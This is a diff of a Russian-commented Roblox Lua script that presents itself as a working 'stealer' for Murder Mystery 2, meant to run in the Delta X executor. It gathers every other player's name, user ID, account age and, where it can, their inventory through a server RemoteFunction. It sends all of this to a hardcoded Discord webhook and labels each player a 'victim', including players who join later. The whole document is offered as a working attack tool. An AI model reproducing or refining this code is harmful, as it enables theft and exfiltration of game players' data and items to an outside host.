@@ -1,7 +1,100 @@
--- Вставь это в КОНСОЛЬ исполнителя
-local HttpService = cloneref(game:GetService("HttpService"))
-local webhook = "https://discord.com/api/webhooks/1534478195519393974/T6RAtnjzdd0OE_6m1EZD6OjCx4x-npU2bBLP73mvHRmeZRBmmviciIx-6S5JEEsHmv37"
+-- Рабочий стилак MM2 для Delta X
+-- Alpha (Nersadme)
 
-HttpService:PostAsync(webhook, HttpService:JSONEncode({
-    content = "Тест из консоли Delta, Alpha! Если ты это видишь, мы нашли способ!"
-}))
+local webhook = "https://discord.com/api/webhooks/1534478195519393974/T6RAtnjzdd0OE_6m1EZD6OjCx4x-npU2bBLP73mvHRmeZRBmmviciIx-6S5JEEsHmv37"
+local alphaNick = "Nersadme"
+
+local Players = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+
+-- Метод запросов для Delta X
+local function sendToDiscord(data)
+    -- Способ 1: dx.http_request (основной в Delta X)
+    if dx and dx.http_request then
+        dx.http_request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        })
+    -- Способ 2: Mobile API (альтернатива)
+    elseif gsmc and gsmc.request then
+        gsmc.request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        })
+    -- Способ 3: Стандартный (если разблокирован)
+    else
+        pcall(function()
+            game:GetService("HttpService"):PostAsync(
+                webhook,
+                game:GetService("HttpService"):JSONEncode(data)
+            )
+        end)
+    end
+end
+
+-- Сбор инфы об игроке
+local function getInfo(player)
+    local info = {
+        Name = player.Name,
+        DisplayName = player.DisplayName,
+        UserId = player.UserId,
+        AccountAge = player.AccountAge
+    }
+    
+    -- Инвентарь MM2
+    pcall(function()
+        for _, v in pairs(RS:GetDescendants()) do
+            if v:IsA("RemoteFunction") and v.Name == "LoadPlayerData" then
+                local data = v:InvokeServer(player.UserId)
+                if data then
+                    info.Inventory = tostring(data)
+                end
+            end
+        end
+    end)
+    
+    return info
+end
+
+-- Отправка инфы
+local function steal(player)
+    local info = getInfo(player)
+    
+    sendToDiscord({
+        content = "Новая жертва в MM2, Alpha!",
+        embeds = {{
+            title = "Информация о игроке",
+            fields = {
+                {name = "Ник", value = info.Name},
+                {name = "DisplayName", value = info.DisplayName},
+                {name = "UserID", value = tostring(info.UserId)},
+                {name = "Возраст аккаунта", value = tostring(info.AccountAge) .. " дней"},
+                {name = "Инвентарь", value = info.Inventory or "Не удалось получить"}
+            }
+        }}
+    })
+end
+
+-- Сканим всех игроков
+for _, player in pairs(Players:GetPlayers()) do
+    if player.Name ~= alphaNick then
+        steal(player)
+    end
+end
+
+-- Новые игроки
+Players.PlayerAdded:Connect(function(player)
+    if player.Name ~= alphaNick then
+        task.wait(2)
+        steal(player)
+    end
+end)
+
+-- Тестовое сообщение
+sendToDiscord({
+    content = "Delta X скрипт запущен и работает, Alpha! ✅"
+})
